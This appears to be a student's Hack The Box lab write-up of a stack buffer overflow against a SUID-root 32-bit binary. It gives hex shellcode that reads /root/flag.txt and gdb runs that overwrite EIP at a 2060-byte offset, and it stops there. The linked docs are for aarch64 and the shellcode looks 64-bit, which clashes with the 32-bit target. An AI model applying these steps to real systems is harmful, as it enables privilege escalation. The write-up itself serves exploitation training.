## Background: 

We've recycled a password to SSH into annother Linux machine during a pen test.

We login with a standard access account, htb-student. The program leave_msg allows us to leave a message for an admin.

We see that these messages are stored in "/htb-student/msg.txt," which is binary owned by the user root, and the SUID bit is set.

Let's see if we can exploit the program with Stack-Based Buffer Overflow to read the file "/root/flag.txt".


# Shellcode:

First lets start by generating shell code that can cat a file.

- We can use pwntools for this: https://docs.pwntools.com/en/stable/shellcraft/aarch64.html#pwnlib.shellcraft.aarch64.linux.cat

We'll need to make a flag to test the code:

    echo "HTB{f4lS3_fLag}" > flag.txt

Now use shellcodePwn.py to generatecode to read the file "flag.txt":

    ./shellcodePwn.py 
    6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05

Next, we'll test it:

    ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
    Shellcode Output:
    HTB{f4lS3_fLag}

Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":

    $ ./shellcodePwn.py 
    48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05


# Note:

We need to be aware that this server is using python2, so we may need to adjust our commands accordingly.

    python --version
    Python 2.7.17


# Inspect Binary:

Lets inspect the exe to see what we are working with:

    file leave_msg
    leave_msg: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8694607c1cba3fb3814a144fb014da53d3f3e49e, not stripped

The file is using 32-bit registers.


# Overflow:

Lets use gdb to test different payloads and see if we can break the program.

If the payload is sufficienly large we get:

    (gdb) r $(python -c "print('A'*3000)")
    Starting program: /home/htb-student/leave_msg $(python -c "print('A'*3000)")
    
    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()

If we inspect the registers we see what caused the segfault:

    (gdb) info registers
    eax            0x0	0
    ecx            0x15	21
    edx            0x56558158	1448444248
    ebx            0x41414141	1094795585
    esp            0xffffc9c0	0xffffc9c0
    ebp            0x41414141	0x41414141
    esi            0xffffca00	-13824
    edi            0x0	0
    eip            0x41414141	0x41414141
    eflags         0x10282	[ SF IF RF ]
    cs             0x23	35
    ss             0x2b	43
    ds             0x2b	43
    es             0x2b	43
    fs             0x0	0
    gs             0x63	99

- We've overwritten EIP.

Now that we know we can overwrite the Instruction Pointer, lets see how many bytes it takes to reach EIP.

- To do this well adjust the payload to a "x" number of A characters, and 4 B characters.

        (gdb) r $(python -c "print('A'*2060+'B'*4)")
        Starting program: /home/htb-student/leave_msg $(python -c "print('A'*2060+'B'*4)")
        
        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()

- Since the 32-bit register has been overwritten by 4 bytes of "42", we now know that we need to send 2060 bytes before we reach EIP.




























